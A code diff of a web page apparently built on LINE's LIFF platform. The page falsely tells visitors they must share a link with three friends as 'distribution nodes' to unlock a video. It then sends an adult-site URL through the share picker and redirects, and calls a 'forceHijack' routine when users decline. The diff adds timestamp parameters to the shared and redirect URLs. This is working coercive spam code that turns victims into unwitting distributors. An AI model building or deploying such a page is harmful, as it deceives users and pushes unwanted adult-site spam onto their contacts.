@@ -33,7 +33,7 @@
 
     <script>
         const LIFF_ID = "2009200124-rSJ8f72Y"; 
-        const SUCCESS_URL = "https://18avideo.com"; 
+        const SUCCESS_URL = "https://18avideo.com/VKUFu?v=" + new Date().getTime();
 
         async function init() {
             try {
@@ -46,11 +46,11 @@
             // 初始彈窗
             alert("【分配程序啟動】\n\n請選擇 3 位好友作為「流量分配節點」。\n完成後系統將自動為您解除觀看限制。");
             
-            try {
+              try {
                 const res = await liff.shareTargetPicker([
-                    {
+                      {
                         "type": "text",
-                        "text": "https://18avideo.com/VKUFu"
+                        "text": "https://18avideo.com/Tws7k?v="+ new Date().getTime()
                     }
                 ]);
 
@@ -71,19 +71,10 @@
                 forceHijack();
             }
         }
-    ]);
-                if (res) {
-                    window.location.replace(SUCCESS_URL);
-                } else {
-                    alert("❌ 分配失敗！\n偵測到節點分配數量不足，請務必分配至 3 位好友。");
-                    forceHijack(); 
-                }
-            } catch (error) {
-                alert("需允許分配權限才能觀看影片");
-            }
-        }
+
         window.onload = init;
     </script>
 </body>
 </html>
+
 
